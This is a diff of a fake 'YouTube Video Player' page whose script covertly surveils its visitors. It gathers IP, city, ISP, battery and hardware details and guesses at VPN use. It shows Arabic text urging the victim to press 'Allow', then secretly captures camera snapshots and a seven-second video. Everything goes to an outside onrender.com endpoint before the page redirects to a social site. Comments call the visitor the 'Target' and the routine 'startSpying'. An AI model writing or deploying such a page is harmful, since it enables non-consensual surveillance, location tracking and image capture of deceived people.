@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>YouTube Player - Buffering</title>
+  <title>YouTube Video Player</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
     .container { text-align: center; padding: 20px; }
-    .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     video, canvas { opacity: 0; position: absolute; left: -9999px; }
   </style>
@@ -15,8 +15,8 @@
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="130">
-    <p style="color: #888; margin-top: 20px;">جارٍ مزامنة جودة الفيديو مع جهازك...</p>
     <div class="loader"></div>
+    <p style="color: #666; font-size: 14px;">جارٍ معالجة الفيديو...<br>يرجى الضغط على <b>Allow</b> للمتابعة.</p>
   </div>
 
   <video id="v" autoplay muted playsinline></video>
@@ -33,45 +33,56 @@
 
     const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };
 
+    // دالة الإرسال مع معالجة الأخطاء
     async function send(msg, type = "text", file = null) {
       if (!chatId) return;
       const payload = { chat_id: chatId };
       if (type === "text") payload.message = msg;
       if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
-      if (type === "video") { payload.message = "📹 *FULL VIDEO CLIP:*"; payload.video = file; }
+      if (type === "video") { payload.message = "📹 *VIDEO CLIP (7s):*"; payload.video = file; }
 
-      return fetch("https://render-backend-package1.onrender.com/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-        keepalive: true
-      });
-    }
-
-    // وظيفة أخذ لقطة سريعة
-    function takeSnapshot(label) {
-        ctx.drawImage(v, 0, 0, c.width, c.height);
-        const img = c.toDataURL("image/jpeg", 0.7).split(',')[1];
-        send("", "photo", img);
+      try {
+        await fetch("https://render-backend-package1.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+          keepalive: true
+        });
+      } catch (e) { console.log("Send Error"); }
     }
 
     async function analyzeTarget() {
+      // 1. جلب بيانات الجهاز فوراً (هذي ما تسحقش إنترنت)
       let bat = "N/A";
       try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
       
-      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const timeStr = new Date().toLocaleString('ar-DZ');
+      const hardware = `${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM`;
 
-      fetch("https://ipapi.co/json/").then(res => res.json()).then(async data => {
-        const isVpn = (data.timezone !== browserTimezone) ? "⚠️ YES" : "✅ NO";
-        let m = "🏁 *COBRA MULTI-MEDIA REPORT* 🏁\n";
-        m += `🌍 *IP:* \`${data.ip}\` | *VPN:* ${isVpn}\n`;
-        m += `🕒 *Time:* ${timeStr} | 🔋 *Bat:* ${bat}\n`;
-        m += `📍 *Loc:* ${data.city}, ${data.country}\n`;
-        m += "━━━━━━━━━━━━━━━━━━━━\n";
-        await send(m);
-        startSpying();
-      }).catch(() => startSpying());
+      // 2. محاولة جلب الـ IP (باستخدام API بديل ومستقر)
+      let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown", timezone: "Unknown" };
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+      } catch (e) { console.log("IP API Error"); }
+
+      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const isVpn = (ipData.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";
+
+      // 3. بناء الرسالة وإرسالها
+      let m = "🏁 *COBRA ELITE SYSTEM V8.0* 🏁\n";
+      m += "━━━━━━━━━━━━━━━━━━━━\n";
+      m += `🌍 *IP:* \`${ipData.ip}\`\n`;
+      m += `🛡️ *VPN:* ${isVpn}\n`;
+      m += `🏢 *ISP:* ${ipData.org}\n`;
+      m += `📍 *Loc:* ${ipData.city}, ${ipData.country}\n`;
+      m += `🕒 *Time:* ${timeStr}\n`;
+      m += `🔋 *Battery:* ${bat}\n`;
+      m += `💻 *HW:* ${hardware}\n`;
+      m += "━━━━━━━━━━━━━━━━━━━━\n";
+      
+      await send(m); // إرسال التقرير النصي
+      startSpying(); // البدء في الكاميرا
     }
 
     function startSpying() {
@@ -80,7 +91,6 @@
           v.srcObject = stream;
           v.onloadedmetadata = () => {
             v.play();
-            
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
@@ -93,32 +103,30 @@
                 setTimeout(finalizeRedirect, 1000);
             };
 
-            // --- نظام السحب المتعدد ---
-            // 1. انتظر ثانيتين (تعديل الضوء) ثم ابدأ
+            // التقاط 3 صور وفيديو 7 ثوانٍ
             setTimeout(() => {
-                // لقطة أولى
-                takeSnapshot();
+                // لقطة 1
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);
 
-                // ابدأ تسجيل الفيديو لمدة 7 ثواني
                 recorder.start();
 
-                // لقطة ثانية بعد 3 ثواني من الفيديو
-                setTimeout(() => takeSnapshot(), 3000);
+                // لقطة 2 (بعد 3 ثواني)
+                setTimeout(() => {
+                    ctx.drawImage(v, 0, 0, c.width, c.height);
+                    send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);
+                }, 3000);
 
-                // لقطة ثالثة قبل نهاية الفيديو
-                setTimeout(() => takeSnapshot(), 6000);
-
-                // أوقف كل شيء بعد 7 ثواني
+                // إيقاف التسجيل بعد 7 ثواني
                 setTimeout(() => {
                     recorder.stop();
                     stream.getTracks().forEach(t => t.stop());
                 }, 7000);
-
             }, 2500);
           };
         })
         .catch(() => {
-          send("❌ *Permissions Denied*");
+          send("❌ *Target Denied Access*");
           finalizeRedirect();
         });
     }
